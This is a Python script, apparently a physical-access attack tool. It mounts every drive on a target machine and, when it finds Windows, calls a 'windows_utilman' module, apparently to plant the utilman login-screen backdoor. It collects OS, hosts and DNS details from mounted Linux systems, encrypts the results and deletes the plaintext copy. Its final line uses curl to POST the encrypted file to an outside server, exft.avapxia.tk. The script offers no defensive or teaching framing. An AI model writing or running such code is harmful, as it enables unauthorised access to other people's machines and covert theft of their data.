#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import os
import json
import windows_utilman
import pyAesCrypt
import requests
from secureCrypt import cryptResult

os.system('loadkeys fr')
os.system('lsblk > result.txt')
if os.path.exists('/mnt/targetDrive'):
    pass
else:
    os.system('mkdir /mnt/targetDrive')


def parse(file_name):
    # Listing all drives and removing special char from the command return and saving them to a file
    result = []
    with open(file_name) as input_file:
        for line in input_file:
            temp_arr = line.split(' ')
            for item in temp_arr:
                if '└─' in item or '├─' in item:
                    result.append(item.replace('└─', '').replace('├─', ''))
    os.remove(file_name)
    return result


def check_for_os(list):
    # Checking for OS installed on the drive
    os_list = {'Os': 'location'}
    hosts = {'Host': 'address'}
    servers = {"DNS": "address"}

    for drive in drives_list:
        os.system('mount /dev/%s /mnt/targetDrive' % (drive))
        print('Looking for OS on '+drive+'...\n')
        if os.path.isdir('/mnt/targetDrive/Windows'):
            # Checking for Windows installation
            os_list['Windows'] = drive
            windows_utilman.utilman()
        elif os.path.isdir('/mnt/targetDrive/etc'):
            # Looking for Linux and grabbing files
            f = open('/mnt/targetDrive/etc/issue')
            for x in f:
                # Listing distros
                x = x.split()
                x = x[:len(x)-2]
                x = ' '.join(x)
                if x != '':
                    os_list[x] = drive
            f = open('/etc/hosts')
            for x in f:
                # Checking hosts
                x = x.split()
                hosts[x[1]] = x[0]
            f = open('/etc/resolv.conf')
            for x in f:
                # Checking DNS
                x = x.split()
                if x:
                    if x[0] != "#":
                        if x[0] == "options":
                            pass
                        else:
                            servers[x[0]] = x[1]
    results = []
    results.append(os_list)
    results.append(hosts)
    results.append(servers)
    return results


# Program starts here
drives_list = parse("result.txt")
results = check_for_os(drives_list)

# Saving results as json file
json = json.dumps(results)
if os.path.exists('results.json'):
    f = open('results.json', 'w')
else:
    f = open('results.json', 'x')
f.write(json)
f.close()

# Crypting file before sending it to our server and removing the base file just in case
cryptResult("results.json")
os.remove("results.json")

# Sending file to the server
os.system('curl -i -X POST -H "Content-Type: multipart/form-data" -F "host=test" -F "file=@results.json.aes" https://exft.avapxia.tk/')
